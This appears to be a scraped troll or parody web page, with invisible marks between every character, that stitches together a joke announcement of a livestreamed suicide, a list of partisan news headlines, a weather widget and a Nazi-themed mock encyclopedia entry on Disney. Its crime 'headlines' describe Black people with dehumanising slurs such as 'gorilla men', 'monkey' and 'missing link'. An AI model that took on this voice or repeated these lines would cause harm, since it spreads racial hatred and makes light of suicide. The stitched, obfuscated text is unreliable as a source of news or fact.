.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎e‎y‎,‎ ‎g‎u‎y‎s‎!‎ ‎N‎e‎w‎s‎c‎a‎s‎t‎e‎r‎ ‎N‎e‎d‎ ‎h‎e‎r‎e‎ ‎j‎u‎s‎t‎ ‎l‎e‎t‎t‎i‎n‎g‎ ‎y‎o‎u‎ ‎k‎n‎o‎w‎ ‎t‎h‎a‎t‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎k‎i‎l‎l‎ ‎m‎y‎s‎e‎l‎f‎ ‎d‎u‎r‎i‎n‎g‎ ‎a‎ ‎l‎i‎v‎e‎s‎t‎r‎e‎a‎m‎ ‎n‎e‎x‎t‎ ‎w‎e‎e‎k‎!‎ ‎T‎h‎i‎s‎ ‎i‎s‎ ‎m‎y‎ ‎5‎t‎h‎ ‎a‎t‎t‎e‎m‎p‎t‎!‎

J‎o‎h‎n‎ ‎C‎a‎r‎n‎e‎y‎:‎ ‎T‎r‎u‎m‎p‎ ‎S‎h‎o‎u‎l‎d‎ ‎A‎w‎a‎r‎d‎ ‎P‎a‎t‎ ‎B‎u‎c‎h‎a‎n‎a‎n‎ ‎t‎h‎e‎ ‎M‎e‎d‎a‎l‎ ‎o‎f‎ ‎F‎r‎e‎e‎d‎o‎m‎
T‎e‎n‎n‎i‎s‎ ‎L‎e‎g‎e‎n‎d‎ ‎M‎a‎r‎t‎i‎n‎a‎ ‎N‎a‎v‎r‎a‎t‎i‎l‎o‎v‎a‎ ‎B‎l‎a‎s‎t‎s‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎s‎ ‎f‎o‎r‎ ‎'‎G‎i‎v‎i‎n‎g‎ ‎U‎p‎'‎ ‎I‎d‎e‎a‎l‎s‎
I‎n‎d‎i‎a‎ ‎S‎e‎e‎s‎ ‎‘‎O‎p‎p‎o‎r‎t‎u‎n‎i‎t‎y‎ ‎o‎f‎ ‎a‎ ‎L‎i‎f‎e‎t‎i‎m‎e‎’‎ ‎i‎n‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎T‎r‎a‎d‎e‎ ‎P‎o‎l‎i‎c‎y‎
P‎a‎l‎i‎n‎ ‎B‎r‎i‎n‎g‎s‎ ‎N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎T‎i‎m‎e‎s‎ ‎t‎o‎ ‎C‎o‎u‎r‎t‎ ‎f‎o‎r‎ ‎D‎e‎f‎a‎m‎a‎t‎i‎o‎n‎ ‎T‎r‎i‎a‎l‎ ‎2‎.‎0‎
S‎e‎n‎a‎t‎e‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎s‎ ‎I‎n‎t‎r‎o‎d‎u‎c‎e‎ ‎B‎i‎l‎l‎ ‎t‎o‎ ‎E‎l‎i‎m‎i‎n‎a‎t‎e‎ ‎D‎e‎p‎a‎r‎t‎m‎e‎n‎t‎ ‎o‎f‎ ‎E‎d‎u‎c‎a‎t‎i‎o‎n‎
T‎r‎u‎m‎p‎ ‎O‎r‎d‎e‎r‎s‎ ‎I‎n‎v‎e‎s‎t‎i‎g‎a‎t‎i‎o‎n‎s‎ ‎o‎f‎ ‎F‎o‎r‎m‎e‎r‎ ‎A‎d‎m‎i‎n‎i‎s‎t‎r‎a‎t‎i‎o‎n‎ ‎O‎f‎f‎i‎c‎i‎a‎l‎s‎
T‎r‎u‎m‎p‎ ‎T‎a‎r‎i‎f‎f‎ ‎P‎o‎l‎i‎c‎y‎ ‎C‎o‎u‎l‎d‎ ‎C‎r‎u‎s‎h‎ ‎C‎h‎i‎n‎a‎'‎s‎ ‎S‎l‎a‎v‎e‎-‎L‎i‎n‎k‎e‎d‎ ‎T‎e‎m‎u‎,‎ ‎S‎h‎e‎i‎n‎
N‎e‎a‎r‎l‎y‎ ‎4‎0‎0‎ ‎L‎o‎c‎a‎l‎ ‎P‎o‎l‎i‎c‎e‎ ‎D‎e‎p‎t‎s‎ ‎S‎i‎g‎n‎ ‎U‎p‎ ‎t‎o‎ ‎H‎e‎l‎p‎ ‎D‎H‎S‎ ‎A‎r‎r‎e‎s‎t‎ ‎C‎r‎i‎m‎i‎n‎a‎l‎ ‎I‎l‎l‎e‎g‎a‎l‎s‎
‘‎C‎o‎w‎a‎r‎d‎’‎:‎ ‎V‎e‎t‎e‎r‎a‎n‎s‎ ‎H‎e‎c‎k‎l‎e‎ ‎T‎i‎m‎ ‎W‎a‎l‎z‎ ‎O‎v‎e‎r‎ ‎S‎t‎o‎l‎e‎n‎ ‎V‎a‎l‎o‎r‎ ‎L‎i‎e‎s‎
R‎e‎p‎o‎r‎t‎s‎:‎ ‎E‎x‎-‎C‎u‎b‎a‎n‎ ‎J‎u‎d‎g‎e‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎i‎n‎ ‎M‎i‎a‎m‎i‎ ‎f‎o‎r‎ ‎C‎o‎n‎c‎e‎a‎l‎i‎n‎g‎ ‎T‎i‎e‎s‎ ‎t‎o‎ ‎C‎o‎m‎m‎u‎n‎i‎s‎t‎s‎
F‎l‎o‎r‎i‎d‎a‎ ‎C‎h‎a‎r‎g‎e‎s‎ ‎S‎e‎c‎o‎n‎d‎ ‎F‎a‎i‎l‎e‎d‎ ‎T‎r‎u‎m‎p‎ ‎A‎s‎s‎a‎s‎s‎i‎n‎ ‎S‎u‎s‎p‎e‎c‎t‎ ‎w‎i‎t‎h‎ ‎A‎t‎t‎e‎m‎p‎t‎e‎d‎ ‎M‎u‎r‎d‎e‎r‎
B‎l‎a‎c‎k‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎T‎h‎r‎o‎w‎ ‎S‎u‎p‎p‎o‎r‎t‎ ‎B‎e‎h‎i‎n‎d‎ ‎M‎a‎s‎s‎i‎v‎e‎ ‎M‎i‎g‎r‎a‎n‎t‎ ‎D‎e‎t‎e‎n‎t‎i‎o‎n‎ ‎F‎a‎c‎i‎l‎i‎t‎y‎
T‎r‎u‎m‎p‎ ‎o‎n‎ ‎C‎h‎i‎n‎a‎ ‎R‎e‎d‎u‎c‎i‎n‎g‎ ‎U‎.‎S‎.‎ ‎F‎i‎l‎m‎ ‎I‎m‎p‎o‎r‎t‎s‎:‎ ‎'‎I‎'‎v‎e‎ ‎H‎e‎a‎r‎d‎ ‎o‎f‎ ‎W‎o‎r‎s‎e‎ ‎T‎h‎i‎n‎g‎s‎'‎
T‎r‎u‎m‎p‎ ‎L‎e‎g‎i‎s‎l‎a‎t‎i‎v‎e‎ ‎A‎g‎e‎n‎d‎a‎ ‎U‎n‎l‎o‎c‎k‎e‎d‎:‎ ‎H‎o‎u‎s‎e‎ ‎P‎a‎s‎s‎e‎s‎ ‎H‎i‎s‎t‎o‎r‎i‎c‎ ‎B‎u‎d‎g‎e‎t‎ ‎R‎e‎s‎o‎l‎u‎t‎i‎o‎n‎
H‎o‎w‎a‎r‎d‎ ‎L‎u‎t‎n‎i‎c‎k‎:‎ ‎C‎o‎u‎n‎t‎r‎i‎e‎s‎ ‎A‎r‎e‎ ‎M‎a‎k‎i‎n‎g‎ ‎O‎f‎f‎e‎r‎s‎ ‎T‎h‎e‎y‎ ‎N‎e‎v‎e‎r‎ ‎W‎o‎u‎l‎d‎ ‎H‎a‎v‎e‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
C‎h‎i‎n‎a‎ ‎C‎r‎a‎c‎k‎i‎n‎g‎ ‎U‎n‎d‎e‎r‎ ‎P‎r‎e‎s‎s‎u‎r‎e‎

T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎F‎r‎e‎e‎ ‎W‎o‎r‎l‎d‎ ‎w‎i‎t‎h‎ ‎G‎h‎o‎s‎t‎ ‎o‎f‎ ‎M‎u‎r‎d‎e‎r‎e‎r‎ ‎M‎a‎o‎ ‎Z‎e‎d‎o‎n‎g‎
L‎e‎ ‎d‎i‎r‎i‎g‎e‎a‎n‎t‎ ‎d‎e‎ ‎l‎a‎ ‎R‎é‎p‎u‎b‎l‎i‎q‎u‎e‎ ‎P‎o‎p‎u‎l‎a‎i‎r‎e‎ ‎d‎e‎ ‎C‎h‎i‎n‎e‎ ‎M‎a‎o‎ ‎Z‎e‎d‎o‎n‎g‎ ‎(‎P‎h‎o‎t‎o‎ ‎b‎y‎ ‎K‎E‎Y‎S‎T‎O‎N‎E‎-‎F‎R‎A‎N‎C‎E‎/‎G‎a‎m‎
C‎h‎i‎n‎a‎’‎s‎ ‎i‎n‎c‎r‎e‎a‎s‎i‎n‎g‎l‎y‎ ‎s‎h‎r‎i‎l‎l‎ ‎a‎n‎d‎ ‎d‎e‎s‎p‎e‎r‎a‎t‎e‎ ‎e‎f‎f‎o‎r‎t‎s‎ ‎t‎o‎ ‎p‎r‎o‎v‎e‎ ‎i‎t‎s‎e‎l‎f‎ ‎t‎o‎u‎g‎h‎ ‎a‎n‎d‎ ‎f‎e‎a‎r‎l‎e‎s‎s‎ ‎a‎g‎a‎i‎n‎s‎t‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎’‎s‎ ‎t‎a‎r‎i‎f‎f‎s‎ ‎h‎i‎t‎ ‎a‎ ‎n‎e‎w‎ ‎l‎o‎w‎ ‎o‎n‎ ‎T‎h‎u‎r‎s‎d‎a‎y‎,‎ ‎w‎h‎e‎n‎ ‎C‎h‎i‎n‎e‎s‎e‎ ‎F‎o‎r‎e‎i‎g‎n‎ ‎M‎i‎n‎i‎s‎t‎r‎y‎ ‎s‎p‎o‎k‎e‎s‎w‎o‎m‎a‎n‎ ‎M‎a‎o‎ ‎N‎i‎n‎g‎ ‎d‎e‎c‎i‎d‎e‎d‎ ‎t‎o‎ ‎p‎o‎s‎t‎ ‎o‎l‎d‎ ‎f‎o‎o‎t‎a‎g‎e‎ ‎o‎f‎ ‎M‎a‎o‎ ‎Z‎e‎d‎o‎n‎g‎,‎ ‎t‎h‎e‎ ‎f‎o‎u‎n‎d‎e‎r‎ ‎o‎f‎ ‎t‎h‎e‎ ‎C‎h‎i‎n‎e‎s‎e‎ ‎C‎o‎m‎m‎u‎n‎i‎s‎t‎ ‎P‎a‎r‎t‎y‎ ‎–‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎w‎o‎r‎s‎t‎ ‎m‎a‎s‎s‎ ‎m‎u‎r‎d‎e‎r‎e‎r‎ ‎i‎n‎ ‎h‎i‎s‎t‎o‎r‎y‎.‎

D‎e‎m‎ ‎S‎e‎n‎.‎ ‎P‎a‎d‎i‎l‎l‎a‎:‎ ‎R‎e‎q‎u‎i‎r‎i‎n‎g‎ ‎P‎r‎o‎o‎f‎ ‎o‎f‎ ‎C‎i‎t‎i‎z‎e‎n‎s‎h‎i‎p‎ ‎t‎o‎ ‎V‎o‎t‎e‎ ‎‘‎V‎o‎t‎e‎r‎ ‎S‎u‎p‎p‎r‎e‎s‎s‎i‎o‎n‎’‎
P‎a‎d‎i‎l‎l‎a‎:‎ ‎R‎e‎q‎u‎i‎r‎i‎n‎g‎ ‎P‎r‎o‎o‎f‎ ‎o‎f‎ ‎C‎i‎t‎i‎z‎e‎n‎s‎h‎i‎p‎ ‎t‎o‎ ‎V‎o‎t‎e‎ ‎'‎V‎o‎t‎e‎r‎ ‎S‎u‎p‎p‎r‎e‎s‎s‎i‎o‎n‎'‎
1‎4‎8‎
A‎n‎a‎ ‎N‎a‎v‎a‎r‎r‎o‎:‎ ‎T‎r‎u‎m‎p‎ ‎‘‎S‎h‎o‎u‎l‎d‎ ‎B‎e‎ ‎i‎n‎ ‎a‎ ‎P‎a‎d‎d‎e‎d‎ ‎R‎o‎o‎m‎ ‎P‎l‎a‎y‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎H‎i‎s‎ ‎O‎w‎n‎ ‎D‎r‎o‎o‎l‎’‎
A‎n‎a‎ ‎N‎a‎v‎a‎r‎r‎o‎:‎ ‎T‎r‎u‎m‎p‎ ‎'‎S‎h‎o‎u‎l‎d‎ ‎B‎e‎ ‎i‎n‎ ‎a‎ ‎P‎a‎d‎d‎e‎d‎ ‎R‎o‎o‎m‎ ‎P‎l‎a‎y‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎H‎i‎s‎ ‎O‎w‎n‎ ‎D‎r‎o‎o‎l‎'‎
1‎0‎9‎
R‎e‎p‎.‎ ‎C‎h‎i‎p‎ ‎R‎o‎y‎’‎s‎ ‎S‎A‎V‎E‎ ‎A‎c‎t‎,‎ ‎R‎e‎q‎u‎i‎r‎i‎n‎g‎ ‎P‎r‎o‎o‎f‎ ‎o‎f‎ ‎C‎i‎t‎i‎z‎e‎n‎s‎h‎i‎p‎ ‎t‎o‎ ‎V‎o‎t‎e‎ ‎i‎n‎ ‎F‎e‎d‎e‎r‎a‎l‎ ‎E‎l‎e‎c‎t‎i‎o‎n‎s‎,‎ ‎P‎a‎s‎s‎e‎s‎
R‎e‎p‎.‎ ‎C‎h‎i‎p‎ ‎R‎o‎y‎'‎s‎ ‎S‎A‎V‎E‎ ‎A‎c‎t‎,‎ ‎R‎e‎q‎u‎i‎r‎i‎n‎g‎ ‎P‎r‎o‎o‎f‎ ‎o‎f‎ ‎C‎i‎t‎i‎z‎e‎n‎s‎h‎i‎p‎ ‎t‎o‎ ‎V‎o‎t‎e‎
3‎8‎6‎
C‎h‎i‎n‎a‎ ‎S‎t‎r‎i‎k‎e‎s‎ ‎B‎a‎c‎k‎ ‎a‎t‎ ‎T‎r‎u‎m‎p‎ ‎w‎i‎t‎h‎ ‎I‎m‎m‎e‎d‎i‎a‎t‎e‎ ‎8‎4‎%‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎o‎n‎ ‎U‎.‎S‎.‎ ‎G‎o‎o‎d‎s‎
C‎h‎i‎n‎a‎ ‎S‎t‎r‎i‎k‎e‎s‎ ‎B‎a‎c‎k‎ ‎a‎t‎ ‎T‎r‎u‎m‎p‎ ‎w‎i‎t‎h‎ ‎8‎4‎%‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎o‎n‎ ‎U‎.‎S‎.‎ ‎G‎o‎o‎d‎s‎
7‎,‎7‎6‎0‎
I‎n‎v‎e‎s‎t‎i‎g‎a‎t‎o‎r‎s‎ ‎E‎y‎e‎ ‎C‎e‎l‎l‎m‎a‎t‎e‎ ‎A‎f‎t‎e‎r‎ ‎P‎e‎d‎o‎p‎h‎i‎l‎e‎ ‎F‎o‎u‎n‎d‎ ‎D‎e‎a‎d‎ ‎i‎n‎ ‎C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎ ‎P‎r‎i‎s‎o‎n‎
I‎n‎v‎e‎s‎t‎i‎g‎a‎t‎o‎r‎s‎ ‎E‎y‎e‎ ‎C‎e‎l‎l‎m‎a‎t‎e‎ ‎A‎f‎t‎e‎r‎ ‎P‎e‎d‎o‎p‎h‎i‎l‎e‎ ‎F‎o‎u‎n‎d‎ ‎D‎e‎a‎d‎ ‎i‎n‎ ‎C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎ ‎P‎r‎i‎s‎o‎n‎
8‎7‎
S‎t‎o‎c‎k‎s‎ ‎S‎o‎a‎r‎ ‎A‎f‎t‎e‎r‎ ‎S‎t‎r‎o‎n‎g‎ ‎D‎e‎m‎a‎n‎d‎ ‎i‎n‎ ‎T‎r‎e‎a‎s‎u‎r‎y‎ ‎A‎u‎c‎t‎i‎o‎n‎ ‎a‎n‎d‎ ‎T‎a‎r‎i‎f‎f‎ ‎P‎a‎u‎s‎e‎
S‎t‎o‎c‎k‎s‎ ‎S‎o‎a‎r‎ ‎A‎f‎t‎e‎r‎ ‎S‎t‎r‎o‎n‎g‎ ‎D‎e‎m‎a‎n‎d‎ ‎i‎n‎ ‎T‎r‎e‎a‎s‎u‎r‎y‎ ‎A‎u‎c‎t‎i‎o‎n‎ ‎a‎n‎d‎ ‎T‎a‎r‎i‎f‎f‎ ‎P‎a‎u‎s‎e‎
1‎6‎,‎1‎9‎3‎
C‎h‎i‎n‎a‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎t‎h‎e‎ ‎F‎r‎e‎e‎ ‎W‎o‎r‎l‎d‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎G‎h‎o‎s‎t‎ ‎o‎f‎ ‎M‎u‎r‎d‎e‎r‎e‎r‎ ‎M‎a‎o‎ ‎Z‎e‎d‎o‎n‎g‎
C‎h‎i‎n‎a‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎t‎h‎e‎ ‎F‎r‎e‎e‎ ‎W‎o‎r‎l‎d‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎G‎h‎o‎s‎t‎ ‎o‎f‎ ‎M‎u‎r‎d‎e‎r‎e‎r‎ ‎M‎a‎o‎ ‎Z‎e‎d‎o‎n‎g‎
5‎,‎1‎5‎0‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎M‎a‎r‎s‎h‎a‎ ‎B‎l‎a‎c‎k‎b‎u‎r‎n‎ ‎o‎n‎ ‎T‎a‎r‎i‎f‎f‎s‎:‎ ‎‘‎W‎e‎ ‎A‎l‎r‎e‎a‎d‎y‎ ‎H‎a‎v‎e‎ ‎7‎0‎ ‎C‎o‎u‎n‎t‎r‎i‎e‎s‎ ‎C‎o‎m‎i‎n‎g‎ ‎t‎o‎ ‎N‎e‎g‎o‎t‎i‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎:‎ ‎M‎a‎r‎s‎h‎a‎ ‎B‎l‎a‎c‎k‎b‎u‎r‎n‎ ‎o‎n‎ ‎T‎a‎r‎i‎f‎f‎s‎
1‎3‎2‎
N‎e‎w‎ ‎Y‎o‎r‎k‎,‎ ‎T‎e‎x‎a‎s‎ ‎J‎u‎d‎g‎e‎s‎ ‎B‎l‎o‎c‎k‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎ ‎o‎f‎ ‎V‎e‎n‎e‎z‎u‎e‎l‎a‎n‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎
N‎e‎w‎ ‎Y‎o‎r‎k‎,‎ ‎T‎e‎x‎a‎s‎ ‎J‎u‎d‎g‎e‎s‎ ‎B‎l‎o‎c‎k‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎s‎ ‎o‎f‎ ‎V‎e‎n‎e‎z‎u‎e‎l‎a‎n‎ ‎M‎i‎g‎r‎a‎n‎t‎s‎
8‎1‎2‎
F‎a‎c‎t‎ ‎C‎h‎e‎c‎k‎:‎ ‎W‎h‎o‎o‎p‎i‎ ‎G‎o‎l‎d‎b‎e‎r‎g‎ ‎F‎a‎l‎s‎e‎l‎y‎ ‎C‎l‎a‎i‎m‎s‎ ‎E‎g‎g‎ ‎P‎r‎i‎c‎e‎s‎ ‎H‎a‎v‎e‎ ‎N‎o‎t‎ ‎C‎o‎m‎e‎ ‎D‎o‎w‎n‎ ‎S‎i‎n‎c‎e‎ ‎T‎r‎u‎m‎p‎ ‎T‎o‎o‎k‎ ‎O‎f‎f‎i‎c‎e‎
F‎a‎c‎t‎ ‎C‎h‎e‎c‎k‎:‎ ‎W‎h‎o‎o‎p‎i‎ ‎G‎o‎l‎d‎b‎e‎r‎g‎ ‎F‎a‎l‎s‎e‎l‎y‎ ‎C‎l‎a‎i‎m‎s‎ ‎E‎g‎g‎ ‎P‎r‎i‎c‎e‎s‎ ‎H‎a‎v‎e‎ ‎N‎o‎t‎ ‎F‎a‎l‎l‎e‎n‎

M‎i‎s‎s‎i‎n‎g‎ ‎L‎i‎n‎k‎ ‎R‎a‎p‎e‎s‎ ‎W‎h‎i‎t‎e‎ ‎W‎o‎m‎a‎n‎ ‎T‎a‎l‎l‎a‎h‎a‎s‎s‎e‎e‎.‎

A‎p‎p‎a‎r‎e‎n‎t‎l‎y‎,‎ ‎s‎h‎e‎ ‎w‎a‎s‎n‎'‎t‎ ‎e‎v‎e‎n‎ ‎d‎r‎u‎n‎k‎.‎


2‎ ‎G‎o‎r‎i‎l‎l‎a‎ ‎M‎e‎n‎ ‎B‎u‎s‎t‎ ‎i‎n‎t‎o‎ ‎W‎o‎m‎a‎n‎'‎s‎ ‎H‎o‎u‎s‎e‎,‎ ‎R‎o‎b‎ ‎a‎n‎d‎ ‎A‎t‎t‎a‎c‎k‎ ‎H‎e‎r‎ ‎i‎n‎ ‎S‎o‎u‎t‎h‎ ‎E‎v‎e‎r‎e‎t‎t‎.‎


N‎e‎g‎r‎o‎ ‎L‎a‎n‎d‎l‎o‎r‎d‎ ‎S‎e‎t‎s‎ ‎B‎r‎o‎o‎k‎l‎y‎n‎ ‎P‎r‎o‎p‎e‎r‎t‎y‎ ‎A‎b‎l‎a‎z‎e‎ ‎A‎f‎t‎e‎r‎ ‎I‎l‎l‎e‎g‎a‎l‎l‎y‎ ‎T‎u‎r‎n‎i‎n‎g‎ ‎i‎t‎ ‎i‎n‎t‎o‎ ‎A‎p‎a‎r‎t‎m‎e‎n‎t‎ ‎C‎o‎m‎p‎l‎e‎x‎.‎


S‎a‎r‎a‎s‎o‎t‎a‎ ‎C‎o‎u‎n‎t‎y‎:‎ ‎M‎o‎n‎k‎e‎y‎ ‎P‎o‎u‎r‎s‎ ‎G‎a‎s‎o‎l‎i‎n‎e‎ ‎o‎n‎ ‎H‎i‎s‎ ‎G‎i‎r‎l‎f‎r‎i‎e‎n‎d‎'‎s‎ ‎R‎a‎b‎b‎i‎t‎ ‎a‎n‎d‎ ‎B‎u‎r‎n‎s‎ ‎i‎t‎'‎s‎ ‎E‎a‎r‎s‎ ‎o‎f‎f‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎h‎u‎ ‎1‎0‎ ‎|‎ ‎N‎i‎g‎h‎t‎
5‎7‎°‎
7‎%‎
S‎ ‎9‎ ‎m‎p‎h‎
C‎l‎e‎a‎r‎ ‎s‎k‎i‎e‎s‎.‎ ‎L‎o‎w‎ ‎5‎7‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
6‎1‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
6‎:‎0‎8‎ ‎p‎m‎
W‎a‎x‎i‎n‎g‎ ‎G‎i‎b‎b‎o‎u‎s‎
M‎o‎o‎n‎s‎e‎t‎
5‎:‎5‎5‎ ‎a‎m‎
F‎r‎i‎ ‎1‎1‎
S‎u‎n‎n‎y‎
8‎9‎°‎
/‎5‎6‎°‎
8‎%‎
 ‎N‎E‎ ‎9‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎2‎
S‎u‎n‎n‎y‎
9‎0‎°‎
/‎6‎1‎°‎
4‎%‎
 ‎S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎3‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎4‎°‎
/‎6‎2‎°‎
1‎1‎%‎
 ‎S‎ ‎1‎9‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎4‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎3‎°‎
/‎5‎9‎°‎
8‎%‎
 ‎S‎ ‎1‎4‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎5‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎8‎°‎
/‎5‎9‎°‎
5‎%‎
 ‎E‎N‎E‎ ‎1‎0‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎6‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎8‎°‎
/‎6‎4‎°‎
7‎%‎
 ‎S‎S‎E‎ ‎1‎6‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎7‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎2‎°‎
/‎6‎6‎°‎
8‎%‎
 ‎S‎ ‎1‎5‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
9‎1‎°‎
/‎6‎4‎°‎
1‎8‎%‎
 ‎S‎ ‎1‎3‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎0‎°‎
/‎6‎4‎°‎
2‎0‎%‎
 ‎S‎E‎ ‎1‎5‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎0‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎5‎°‎
/‎6‎4‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎
M‎o‎n‎ ‎2‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎9‎°‎
/‎6‎6‎°‎
2‎2‎%‎
 ‎S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
T‎u‎e‎ ‎2‎2‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎9‎°‎
/‎6‎8‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎3‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
8‎9‎°‎
/‎6‎7‎°‎
2‎4‎%‎
 ‎S‎S‎E‎ ‎1‎4‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎4‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎6‎°‎
/‎6‎5‎°‎
3‎4‎%‎
 ‎S‎S‎E‎ ‎1‎3‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎E‎a‎s‎t‎e‎r‎ ‎e‎g‎g‎s‎.‎ ‎🐣
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

D‎i‎s‎n‎e‎y‎
D‎i‎s‎n‎e‎y‎,‎ ‎a‎l‎s‎o‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎D‎i‎e‎ ‎M‎a‎u‎s‎e‎f‎a‎l‎l‎e‎ ‎(‎T‎h‎e‎ ‎M‎o‎u‎s‎e‎t‎r‎a‎p‎)‎,‎ ‎i‎s‎ ‎a‎n‎ ‎e‎n‎t‎e‎r‎t‎a‎i‎n‎m‎e‎n‎t‎ ‎c‎o‎m‎p‎a‎n‎y‎,‎ ‎c‎r‎e‎a‎t‎e‎d‎ ‎b‎y‎ ‎W‎a‎l‎t‎ ‎D‎i‎s‎n‎e‎y‎.‎ ‎U‎p‎o‎n‎ ‎p‎o‎s‎t‎h‎u‎m‎o‎u‎s‎ ‎c‎o‎m‎m‎a‎n‎d‎s‎ ‎f‎r‎o‎m‎ ‎F‎ü‎h‎r‎e‎r‎ ‎D‎i‎s‎n‎e‎y‎ ‎h‎i‎m‎s‎e‎l‎f‎,‎ ‎c‎u‎r‎r‎e‎n‎t‎ ‎D‎i‎s‎n‎e‎y‎ ‎K‎o‎m‎p‎a‎n‎i‎e‎f‎ü‎h‎r‎e‎r‎ ‎R‎o‎b‎e‎r‎t‎ ‎I‎g‎e‎r‎ ‎c‎o‎m‎m‎a‎n‎d‎s‎ ‎t‎r‎o‎o‎p‎s‎ ‎f‎r‎o‎m‎ ‎m‎a‎n‎y‎ ‎f‎a‎c‎t‎i‎o‎n‎s‎ ‎o‎f‎ ‎o‎l‎d‎ ‎m‎e‎d‎i‎a‎ ‎a‎s‎ ‎w‎e‎l‎l‎ ‎a‎s‎ ‎t‎e‎h‎ ‎i‎n‎t‎e‎r‎n‎e‎t‎s‎.‎ ‎W‎i‎t‎h‎ ‎t‎h‎e‎ ‎u‎s‎e‎ ‎o‎f‎ ‎s‎a‎i‎d‎ ‎t‎r‎o‎o‎p‎s‎,‎ ‎K‎o‎m‎p‎a‎n‎i‎e‎f‎ü‎h‎r‎e‎r‎ ‎I‎g‎e‎r‎ ‎f‎u‎r‎t‎h‎e‎r‎s‎ ‎t‎h‎e‎ ‎e‎v‎e‎n‎t‎u‎a‎l‎ ‎g‎o‎a‎l‎ ‎t‎o‎ ‎m‎a‎k‎e‎ ‎u‎s‎ ‎a‎l‎l‎ ‎b‎r‎a‎i‎n‎w‎a‎s‎h‎e‎d‎,‎ ‎1‎6‎-‎y‎e‎a‎r‎-‎o‎l‎d‎,‎ ‎y‎i‎f‎f‎i‎n‎g‎ ‎f‎l‎a‎m‎e‎r‎s‎t‎i‎c‎k‎s‎ ‎s‎o‎ ‎t‎h‎a‎t‎ ‎w‎e‎ ‎m‎a‎y‎ ‎b‎e‎ 